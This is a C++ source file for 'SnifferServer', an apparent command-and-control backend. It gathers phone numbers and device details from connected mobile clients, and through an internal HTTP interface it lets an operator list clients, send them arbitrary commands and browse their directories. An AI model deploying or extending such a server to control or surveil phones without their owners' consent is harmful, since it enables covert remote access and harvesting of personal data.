/*
 * SnifferServer.cpp
 *
 *  Created on: 2015-1-13
 *      Author: Max.Chiu
 *      Email: Kingsleyyau@gmail.com
 */

#include "SnifferServer.h"

#include "task/GetClientDirTask.h"
#include "task/SetClientCmdTask.h"

#include <sys/syscall.h>

/* state thread */
class StateRunnable : public KRunnable {
public:
	StateRunnable(SnifferServer *container) {
		mContainer = container;
	}
	virtual ~StateRunnable() {
		mContainer = NULL;
	}
protected:
	void onRun() {
		mContainer->StateRunnableHandle();
	}
private:
	SnifferServer *mContainer;
};

SnifferServer::SnifferServer() {
	// TODO Auto-generated constructor stub
	mpStateRunnable = new StateRunnable(this);
}

SnifferServer::~SnifferServer() {
	// TODO Auto-generated destructor stub
	if( mpStateRunnable ) {
		delete mpStateRunnable;
	}
}

void SnifferServer::Run(const string& config) {
	if( config.length() > 0 ) {
		mConfigFile = config;

		// Reload config
		if( Reload() ) {
			if( miDebugMode == 1 ) {
				LogManager::LogSetFlushBuffer(0);
			} else {
				LogManager::LogSetFlushBuffer(5 * BUFFER_SIZE_1K * BUFFER_SIZE_1K);
			}

			Run();
		} else {
			printf("# Snifer Server can not load config file exit. \n");
		}

	} else {
		printf("# No config file can be use exit. \n");
	}
}

void SnifferServer::Run() {
	/* log system */
	LogManager::GetLogManager()->Start(1000, miLogLevel, mLogDir);
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::Run( "
			"miPort : %d, "
			"miMaxClient : %d, "
			"miMaxHandleThread : %d, "
			"miMaxQueryPerThread : %d, "
			"miTimeout : %d, "
			"miStateTime, %d, "
			"miLogLevel : %d, "
			"mlogDir : %s "
			")",
			miPort,
			miMaxClient,
			miMaxHandleThread,
			miMaxQueryPerThread,
			miTimeout,
			miStateTime,
			miLogLevel,
			mLogDir.c_str()
			);

//	bool bFlag = false;

	mTotal = 0;
	mHit = 0;
	mResponed = 0;

	/* inside server */
	mClientTcpInsideServer.SetTcpServerObserver(this);
	mClientTcpInsideServer.SetHandleSize(1000);
	mClientTcpInsideServer.Start(1000, miPort + 1, 2);
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::Run( Inside TcpServer Init OK )");

	/* match server */
	mClientTcpServer.SetTcpServerObserver(this);
	/**
	 * 预估相应时间,内存数目*超时间隔*每秒处理的任务
	 */
	mClientTcpServer.SetHandleSize(miTimeout * miMaxQueryPerThread);
	mClientTcpServer.Start(miMaxClient, miPort, miMaxHandleThread);
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::Run( TcpServer Init OK )");

	mIsRunning = true;

	mpStateThread = new KThread(mpStateRunnable);
	if( mpStateThread->start() != 0 ) {
	}

	printf("# SnifferServer start OK. \n");
	LogManager::GetLogManager()->Log(LOG_WARNING, "SnifferServer::Run( Init OK )");

	/* call server */
	while( true ) {
		/* do nothing here */
		sleep(5);
	}
}

bool SnifferServer::Reload() {
	bool bFlag = false;
	mConfigMutex.lock();
	if( mConfigFile.length() > 0 ) {
		ConfFile conf;
		conf.InitConfFile(mConfigFile.c_str(), "");
		if ( conf.LoadConfFile() ) {
			// BASE
			miPort = atoi(conf.GetPrivate("BASE", "PORT", "9876").c_str());
			miMaxClient = atoi(conf.GetPrivate("BASE", "MAXCLIENT", "100000").c_str());
			miMaxHandleThread = atoi(conf.GetPrivate("BASE", "MAXHANDLETHREAD", "2").c_str());
			miMaxQueryPerThread = atoi(conf.GetPrivate("BASE", "MAXQUERYPERCOPY", "10").c_str());
			miTimeout = atoi(conf.GetPrivate("BASE", "TIMEOUT", "10").c_str());
			miStateTime = atoi(conf.GetPrivate("BASE", "STATETIME", "30").c_str());

			// LOG
			miLogLevel = atoi(conf.GetPrivate("LOG", "LOGLEVEL", "5").c_str());
			mLogDir = conf.GetPrivate("LOG", "LOGDIR", "log");
			miDebugMode = atoi(conf.GetPrivate("LOG", "DEBUGMODE", "0").c_str());

			mClientTcpServer.SetHandleSize(miTimeout * miMaxQueryPerThread);

			LogManager::GetLogManager()->Log(
					LOG_WARNING,
					"SnifferServer::Reload( "
					"miPort : %d, "
					"miMaxClient : %d, "
					"miMaxHandleThread : %d, "
					"miMaxQueryPerThread : %d, "
					"miTimeout : %d, "
					"miStateTime, %d, "
					"miLogLevel : %d, "
					"mlogDir : %s "
					")",
					miPort,
					miMaxClient,
					miMaxHandleThread,
					miMaxQueryPerThread,
					miTimeout,
					miStateTime,
					miLogLevel,
					mLogDir.c_str()
					);

			bFlag = true;
		}
	}
	mConfigMutex.unlock();
	return bFlag;
}

bool SnifferServer::IsRunning() {
	return mIsRunning;
}

/**
 * New request
 */
bool SnifferServer::OnAccept(TcpServer *ts, Message *m) {
	if( ts == &mClientTcpServer ) {
		Client *client = new Client();
		client->SetClientCallback(this);
		client->fd = m->fd;

		mClientMap.Lock();
		mClientMap.Insert(m->fd, client);
		mClientMap.Unlock();

		LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnAccept( "
				"tid : %d, "
				"fd : [%d], "
				"[客户端上线] "
				")",
				(int)syscall(SYS_gettid),
				m->fd
				);
	}

	return true;
}

void SnifferServer::OnDisconnect(TcpServer *ts, int fd) {
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnDisconnect( "
			"tid : %d, "
			"fd : [%d], "
			"start "
			")",
			(int)syscall(SYS_gettid),
			fd
			);

	if( ts == &mClientTcpServer ) {
		// 客户端下线
		mClientMap.Lock();
		ClientMap::iterator itr = mClientMap.Erase(fd);

		Client* client = itr->second;
		if( client != NULL ) {
			// 关闭会话
			CloseSessionByClient(client);
		}
		delete client;

		mClientMap.Unlock();

		LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnAccept( "
				"tid : %d, "
				"fd : [%d], "
				"[客户端下线] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);

	} else if( ts == &mClientTcpInsideServer ) {
		// 关闭会话
		CloseSessionByRequest(fd);
	}

	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnDisconnect( "
			"tid : %d, "
			"fd : [%d], "
			"end "
			")",
			(int)syscall(SYS_gettid),
			fd
			);
}

void SnifferServer::OnRecvMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnRecvMessage( "
			"tid : %d, "
			"m->fd : [%d], "
			"start "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);
	Message *sm = ts->GetIdleMessageList()->PopFront();
	if( sm != NULL ) {
		sm->fd = m->fd;
		sm->wr = m->wr;
		int ret = -1;

		if( &mClientTcpServer == ts ) {
			// 外部服务请求
			mCountMutex.lock();
			mTotal++;
			mCountMutex.unlock();
			ret = HandleRecvMessage(m, sm);
			if( 0 != ret ) {
				mCountMutex.lock();
				mResponed += sm->totaltime;
				if( ret == 1 ) {
					mHit++;
				}
				mCountMutex.unlock();
			}
		} else if( &mClientTcpInsideServer == ts ){
			// 内部服务请求
			ret = HandleInsideRecvMessage(m, sm);
		}

		if( ret != 0 ) {
			// Process finish, send respond
			ts->SendMessageByQueue(sm);
		} else {
			// receive continue
			ts->GetIdleMessageList()->PushBack(sm);
		}

	} else {
		LogManager::GetLogManager()->Log(
				LOG_WARNING,
				"SnifferServer::OnRecvMessage( "
				"tid : %d, "
				"m->fd : [%d], "
				"No idle message can be use "
				")",
				(int)syscall(SYS_gettid),
				m->fd
				);
		// 断开连接
		ts->Disconnect(m->fd);
	}
	LogManager::GetLogManager()->Log(
			LOG_STAT,
			"SnifferServer::OnRecvMessage( "
			"tid : %d, "
			"m->fd : [%d], "
			"end "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);
}

void SnifferServer::OnSendMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnSendMessage( tid : %d, m->fd : [%d], start )", (int)syscall(SYS_gettid), m->fd);
	if( ts == &mClientTcpInsideServer ) {
		ts->Disconnect(m->fd);
	}
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnSendMessage( tid : %d, m->fd : [%d], end )", (int)syscall(SYS_gettid), m->fd);
}

void SnifferServer::OnTimeoutMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnTimeoutMessage( tid : %d, m->fd : [%d], start )", (int)syscall(SYS_gettid), m->fd);
	Message *sm = ts->GetIdleMessageList()->PopFront();
	if( sm != NULL ) {
		sm->fd = m->fd;
		sm->wr = m->wr;

		mCountMutex.lock();
		mTotal++;
		mResponed += sm->totaltime;
		mCountMutex.unlock();

		HandleTimeoutMessage(m, sm);
		// Process finish, send respond
		ts->SendMessageByQueue(sm);
	} else {
		LogManager::GetLogManager()->Log(
				LOG_WARNING,
				"SnifferServer::OnTimeoutMessage( "
				"tid : %d, "
				"m->fd : [%d], "
				"No idle message can be use "
				")",
				(int)syscall(SYS_gettid),
				m->fd
				);
		// 断开连接
		ts->Disconnect(m->fd);
	}
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::OnTimeoutMessage( tid : %d, m->fd : [%d], end )", (int)syscall(SYS_gettid), m->fd);
}

void SnifferServer::StateRunnableHandle() {
	unsigned int iCount = 0;

	unsigned int iTotal = 0;
	double iSecondTotal = 0;

	unsigned int iHit = 0;
	double iSecondHit = 0;

	double iResponed = 0;

	unsigned int iStateTime = miStateTime;

	while( IsRunning() ) {
		if ( iCount < iStateTime ) {
			iCount++;
		} else {
			iCount = 0;
			iSecondTotal = 0;
			iSecondHit = 0;
			iResponed = 0;

			mCountMutex.lock();
			iTotal = mTotal;
			iHit = mHit;

			if( iStateTime != 0 ) {
				iSecondTotal = 1.0 * iTotal / iStateTime;
				iSecondHit = 1.0 * iHit / iStateTime;
			}
			if( iTotal != 0 ) {
				iResponed = 1.0 * mResponed / iTotal;
			}

			mHit = 0;
			mTotal = 0;
			mResponed = 0;
			mCountMutex.unlock();

			LogManager::GetLogManager()->Log(
					LOG_WARNING,
					"SnifferServer::StateRunnable( "
					"tid : %d, "
					"iTotal : %u, "
					"iHit : %u, "
					"iSecondTotal : %.1lf, "
					"iSecondHit : %.1lf, "
					"iResponed : %.1lf, "
					"iStateTime : %u "
					")",
					(int)syscall(SYS_gettid),
					iTotal,
					iHit,
					iSecondTotal,
					iSecondHit,
					iResponed,
					iStateTime
					);
			LogManager::GetLogManager()->Log(LOG_WARNING,
					"SnifferServer::StateRunnable( "
					"tid : %d, "
					"过去%u秒共收到%u个请求, "
					"成功处理%u个请求, "
					"平均收到%.1lf个/秒, "
					"平均处理%.1lf个/秒, "
					"平均响应时间%.1lf毫秒/个"
					")",
					(int)syscall(SYS_gettid),
					iStateTime,
					iTotal,
					iHit,
					iSecondTotal,
					iSecondHit,
					iResponed
					);

			iStateTime = miStateTime;
		}
		sleep(1);
	}
}

bool SnifferServer::SendRequestMsg2Client(
		const int& request,
		Client* client,
		ITask* task
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::SendRequestMsg2Client( "
			"tid : %d, "
			"request : [%d], "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			request,
			client->fd
			);

	bool bFlag = false;

	Message* sm = mClientTcpServer.GetIdleMessageList()->PopFront();
	if( sm != NULL ) {
		mClient2RequestMap.Lock();
		Session* session = NULL;
		Request2ClientMap::iterator itr = mRequest2ClientMap.Find(request);
		if( itr != mRequest2ClientMap.End() ) {
			session = itr->second;
		} else {
			session = new Session(request, client);
			mRequest2ClientMap.Insert(request, session);
			mClient2RequestMap.Insert(client->fd, session);

			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::SendRequestMsg2Client( "
					"tid : %d, "
					"request : [%d], "
					"client->fd : [%d], "
					"session : %p, "
					"[开始新会话] "
					")",
					(int)syscall(SYS_gettid),
					request,
					client->fd,
					session
					);
		}

		int seq = client->AddSeq();
		session->InsertRequestTask(seq, task);

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::SendRequestMsg2Client( "
				"tid : %d, "
				"request : [%d], "
				"client->fd : [%d], "
				"session : %p, "
				"seq : %d, "
				"task : %p, "
				"[插入任务到会话] "
				")",
				(int)syscall(SYS_gettid),
				request,
				client->fd,
				session,
				seq,
				task
				);

		SCMD* scmd = (SCMD*)sm->buffer;
		task->GetSendCmd(scmd);
		scmd->header.seq = seq;

		sm->fd = client->fd;
		sm->len = sizeof(SCMDH) + scmd->header.len;

		mClientTcpServer.SendMessageByQueue(sm);

		bFlag = true;

		mClient2RequestMap.Unlock();
	}

	return bFlag;
}

bool SnifferServer::ReturnClientMsg2Request(
		Client* client,
		SCMD* scmd
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::ReturnClientMsg2Request( "
			"tid : %d, "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			client->fd
			);

	bool bFlag = false;

	mClient2RequestMap.Lock();
	Client2RequestMap::iterator itr = mClient2RequestMap.Find(client->fd);
	if( itr != mClient2RequestMap.End() ) {
		// 客户端在会话中
		Session* session = itr->second;
		if( session != NULL ) {
			int seq = scmd->header.seq;
			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::ReturnClientMsg2Request( "
					"tid : %d, "
					"client->fd : [%d], "
					"session : %p, "
					"seq : %d, "
					"[客户端在会话中] "
					")",
					(int)syscall(SYS_gettid),
					client->fd,
					session,
					seq
					);

			ITask* task = session->EraseRequestTask(seq);
			if( task != NULL ) {
				// 会话中存在对应的命令号
				LogManager::GetLogManager()->Log(
						LOG_STAT,
						"SnifferServer::ReturnClientMsg2Request( "
						"tid : %d, "
						"client->fd : [%d], "
						"task : %p, "
						"[会话中存在对应的命令号] "
						")",
						(int)syscall(SYS_gettid),
						client->fd,
						task
						);

				Message* sm = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
				if( sm != NULL ) {
					char buffer[MAXLEN] = {'\0'};
					int len;
					task->GetReturnData(scmd, buffer, len);

					snprintf(
							sm->buffer,
							MAXLEN - 1,
							"HTTP/1.1 200 OK\r\nContext-Length:%d\r\n\r\n%s",
							len,
							buffer
							);

					sm->fd = session->request;
					sm->len = strlen(sm->buffer);

					mClientTcpInsideServer.SendMessageByQueue(sm);

					bFlag = true;
				}

				delete task;
				task = NULL;

			} else {
				LogManager::GetLogManager()->Log(
						LOG_STAT,
						"SnifferServer::ReturnClientMsg2Request( "
						"tid : %d, "
						"client->fd : [%d], "
						"[会话中不存在对应命令号] "
						")",
						(int)syscall(SYS_gettid),
						client->fd
						);
			}

			mRequest2ClientMap.Erase(session->request);

			delete session;
			session = NULL;

		} else {
			LogManager::GetLogManager()->Log(
					LOG_STAT,
					"SnifferServer::ReturnClientMsg2Request( "
					"tid : %d, "
					"client->fd : [%d], "
					"[客户端不在会话中] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);
		}

		mClient2RequestMap.Erase(itr->first);
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

bool SnifferServer::CloseSessionByRequest(
		const int& request
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::CloseSessionByRequest( "
			"tid : %d, "
			"request : [%d] "
			")",
			(int)syscall(SYS_gettid),
			request
			);

	bool bFlag = false;

	mClient2RequestMap.Lock();
	Request2ClientMap::iterator itr = mRequest2ClientMap.Erase(request);
	if( itr != mRequest2ClientMap.End() ) {
		Session* session = itr->second;
		if( session != NULL ) {
			mClient2RequestMap.Erase(session->client->fd);
			delete session;
		}

		bFlag = true;
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

/**
 * 内部服务器关闭会话
 */
bool SnifferServer::CloseSessionByClient(Client* client) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::CloseSessionByClient( "
			"tid : %d, "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			client->fd
			);
	bool bFlag = false;

	mClient2RequestMap.Lock();
	Client2RequestMap::iterator itr = mClient2RequestMap.Erase(client->fd);
	if( itr != mClient2RequestMap.End() ) {
		Session* session = itr->second;
		if( session != NULL ) {
			// 返回错误
			Message* sm = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
			if( sm != NULL ) {
				Json::Value root;
				Json::FastWriter writer;
				string param;

				root[COMMON_RET] = 0;
				param = writer.write(root);

				snprintf(
						sm->buffer,
						MAXLEN - 1,
						"HTTP/1.1 200 OK\r\nContext-Length:%d\r\n\r\n%s",
						(int)param.length(),
						param.c_str()
						);

				sm->fd = session->request;
				sm->len = strlen(sm->buffer);

				mClientTcpInsideServer.SendMessageByQueue(sm);

				bFlag = true;
			}

			mRequest2ClientMap.Erase(session->request);

			delete session;
		}

		bFlag = true;
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

int SnifferServer::HandleRecvMessage(Message *m, Message *sm) {
	int ret = 0;

	if( m->buffer != NULL ) {
		Client *client = NULL;

		mClientMap.Lock();
		ClientMap::iterator itr = mClientMap.Find(m->fd);
		if( itr != mClientMap.End() ) {
			client = itr->second;
			client->ParseData(m->buffer, m->len);
		}
		mClientMap.Unlock();
	}

	sm->totaltime = GetTickCount() - m->starttime;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::HandleRecvMessage( "
			"tid : %d, "
			"m->fd: [%d], "
			"iTotaltime : %u ms, "
			"ret : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			sm->totaltime,
			ret
			);

	return ret;
}

void SnifferServer::OnParseCmd(Client* client, SCMD* scmd) {
	bool bFlag = false;

	if( client != NULL && scmd != NULL ) {
		LogManager::GetLogManager()->Log(
				LOG_STAT,
				"SnifferServer::OnParseCmd( "
				"tid : %d, "
				"client->fd: [%d] "
				")",
				(int)syscall(SYS_gettid),
				client->fd
				);

		if( scmd->header.bNew ) {
			// 客户端发起命令
			LogManager::GetLogManager()->Log(
					LOG_STAT,
					"SnifferServer::OnParseCmd( "
					"tid : %d, "
					"client->fd: [%d], "
					"[客户端发起命令] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);

		    Json::Reader reader;
		    Json::Value rootRecv;

			switch (scmd->header.scmdt) {
			case SnifferTypeClientInfoResult: {
				// 获取手机号和手机型号返回
		        reader.parse(scmd->param, rootRecv);

		        client->deviceId = rootRecv[DEVICE_ID].asString();
		        client->brand = rootRecv[PHONE_INFO_BRAND].asString();
		        client->model = rootRecv[PHONE_INFO_MODEL].asString();
		        client->phoneNumber = rootRecv[PHONE_INFO_NUMBER].asString();

				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::OnParseCmd( "
						"tid : %d, "
						"fd : [%d], "
						"[获取手机号和手机型号返回] "
						")",
						(int)syscall(SYS_gettid),
						client->fd
						);
			}break;
			default:break;
			}

			bFlag = true;
		} else {
			// 客户端返回命令
			LogManager::GetLogManager()->Log(
					LOG_STAT,
					"SnifferServer::OnParseCmd( "
					"tid : %d, "
					"client->fd: [%d], "
					"[客户端返回命令] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);

			bFlag = ReturnClientMsg2Request(client, scmd);
		}

	}

	LogManager::GetLogManager()->Log(
			LOG_STAT,
			"SnifferServer::OnParseCmd( "
			"tid : %d, "
			"bFlag : %s "
			")",
			(int)syscall(SYS_gettid),
			bFlag?"true":"false"
			);
}

int SnifferServer::HandleTimeoutMessage(Message *m, Message *sm) {
	int ret = -1;

	Json::FastWriter writer;
	Json::Value rootSend, womanListNode, womanNode;

	if( m == NULL ) {
		return ret;
	}

	sm->totaltime = GetTickCount() - m->starttime;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::HandleTimeoutMessage( "
			"tid : %d, "
			"m->fd: [%d], "
			"iTotaltime : %u ms "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			sm->totaltime
			);

	string param = writer.write(rootSend);

	snprintf(sm->buffer, MAXLEN - 1, "HTTP/1.1 200 ok\r\nContext-Length:%d\r\n\r\n%s",
			(int)param.length(), param.c_str());
	sm->len = strlen(sm->buffer);

	return ret;
}

int SnifferServer::HandleInsideRecvMessage(Message *m, Message *sm) {
	int ret = -1;
	int code = 200;
	char reason[16] = {"OK"};
	string param = "";

	Json::FastWriter writer;
	Json::Value rootSend;
	rootSend[COMMON_RET] = 0;

	if( m == NULL ) {
		return ret;
	} else {
		param = writer.write(rootSend);
	}

	DataHttpParser dataHttpParser;
	if ( DiffGetTickCount(m->starttime, GetTickCount()) < miTimeout * 1000 ) {
		if( m->buffer != NULL ) {
			ret = dataHttpParser.ParseData(m->buffer, m->len);
		}
	}

	if( ret == 1 ) {
		ret = -1;
		const char* pPath = dataHttpParser.GetPath();
		HttpType type = dataHttpParser.GetType();

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::HandleInsideRecvMessage( "
				"tid : %d, "
				"m->fd: [%d], "
				"type : %d, "
				"pPath : %s "
				")",
				(int)syscall(SYS_gettid),
				m->fd,
				type,
				pPath
				);

		if( type == GET ) {
			if( strcmp(pPath, GET_CLIENT_LIST) == 0 ) {
				// 获取在线客户端列表
				Json::Value clientListNode;
				if( 1 == GetClientList(clientListNode, m) ) {
					rootSend[CLIENT_LIST] = clientListNode;
					rootSend[COMMON_RET] = 1;
					ret = 1;
				}

				param = writer.write(rootSend);

			} else if( strcmp(pPath, GET_CLIENT_INFO) == 0 ) {
				// 获取在线客户端详细信息
				const char* pClientId = dataHttpParser.GetParam(CLIENT_ID);
				if( (pClientId != NULL) ) {
					Json::Value clientNode;
					if( 1 == GetClientInfo(clientNode, pClientId, m) ) {
						rootSend[CLIENT_INFO] = clientNode;
						ret = 1;
						rootSend[COMMON_RET] = 1;
					}
				}

				param = writer.write(rootSend);

			} else if( strcmp(pPath, SET_CLIENT_CMD) == 0 ) {
				// 执行客户端命令
				const char* pClientId = dataHttpParser.GetParam(CLIENT_ID);
				const char* pCommand = dataHttpParser.GetParam(COMMAND);
				if( (pClientId != NULL) && (pCommand != NULL) ) {
					if( 1 == SetClientCmd(pClientId, pCommand, m) ) {
						// 解析成功, 对客户端发送命令, 不返回
						ret = 0;
					}
				}

			} else if( strcmp(pPath, GET_CLIENT_DIR) == 0 ) {
				// 获取客户端目录
				const char* pClientId = dataHttpParser.GetParam(CLIENT_ID);
				const char* pDirecory = dataHttpParser.GetParam(DIRECTORY);
				const char* pPageIndex = dataHttpParser.GetParam(COMMON_PAGE_INDEX);
				const char* pPageSize = dataHttpParser.GetParam(COMMON_PAGE_SIZE);
				if( (pClientId != NULL) ) {
					if( 1 == GetClientDir(pClientId, pDirecory, pPageIndex, pPageSize, m) ) {
						// 解析成功, 对客户端发送命令, 不返回
						ret = 0;
					}
				}

			} else if( strcmp(pPath, "/RELOAD") == 0 ) {
				// 重新加载配置
				if( Reload()) {
					rootSend[COMMON_RET] = 1;
				}

				param = writer.write(rootSend);
				ret = 1;

			} else {
				// 不匹配的接口
				code = 404;
				sprintf(reason, "Not Found");
				param = "404 Not Found";
			}
		} else {
			code = 404;
			sprintf(reason, "Not Found");
			param = "404 Not Found";
		}

	}

	snprintf(sm->buffer, MAXLEN - 1, "HTTP/1.1 %d %s\r\nContext-Length:%d\r\n\r\n%s",
			code,
			reason,
			(int)param.length(),
			param.c_str()
			);
	sm->len = strlen(sm->buffer);

	return ret;
}

/**
 * 获取在线客户端
 */
int SnifferServer::GetClientList(
		Json::Value& listNode,
		Message *m
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientList( "
			"tid : %d, "
			"m->fd: [%d] "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);

	Client *client = NULL;
	mClientMap.Lock();
	for( ClientMap::iterator itr = mClientMap.Begin(); itr != mClientMap.End(); itr++ ) {
		client = (Client*)itr->second;
		Json::Value clientNode;
		clientNode[CLIENT_ID] = client->fd;
		listNode.append(clientNode);
	}
	mClientMap.Unlock();

	return 1;
}

/**
 * 获取在线客户端详细信息
 */
int SnifferServer::GetClientInfo(
		Json::Value& clientNode,
		const char* clientId,
		Message *m
		) {
	int ret = 0;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientInfo( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId
			);

	Client *client = NULL;
	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(atoi(clientId));
	if( itr != mClientMap.End() ) {
		client = (Client*)itr->second;
		clientNode[CLIENT_ID] = client->fd;
		clientNode[PHONE_INFO_BRAND] = client->brand;
		clientNode[PHONE_INFO_MODEL] = client->model;
		clientNode[PHONE_INFO_NUMBER] = client->phoneNumber;
		ret = 1;
	}
	mClientMap.Unlock();

	return ret;
}

/**
 * 对指定客户端运行命令
 */
int SnifferServer::SetClientCmd(
		const char* clientId,
		const char* command,
		Message *m
		) {
	int ret = 0;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::SetClientCmd( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"command : %s "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId,
			command
			);

	bool bFlag = false;
	int iClientId = atoi(clientId);

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;
		if( client != NULL ) {
			// 创建命令
			SetClientCmdTask* task = new SetClientCmdTask();
			task->SetCommand(command);

			// 发送命令
			if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
				ret = 1;
			}
		}

	}
	mClientMap.Unlock();

	return ret;
}

int SnifferServer::GetClientDir(
		const char* clientId,
		const char* directory,
		const char* pageIndex,
		const char* pageSize,
		Message *m
		) {
	int ret = 0;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientDir( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"directory : %s, "
			"pageIndex : %s, "
			"pageSize : %s "
			""
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId,
			directory,
			pageIndex,
			pageSize
			);

	int iClientId = atoi(clientId);

	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(iClientId);
	if( itr != mClientMap.End() ) {
		Client *client = (Client*)itr->second;

		// 创建命令
		GetClientDirTask* task = new GetClientDirTask();
		task->SetDir(directory);
		task->SetClientId(iClientId);
		task->SetPageIndex(atoi(pageIndex));
		task->SetPageSize(atoi(pageSize));

		// 发送命令
		if( SendRequestMsg2Client(m->fd, client, (ITask*)task) ) {
			ret = 1;
		}
	}
	mClientMap.Unlock();

	return ret;
}
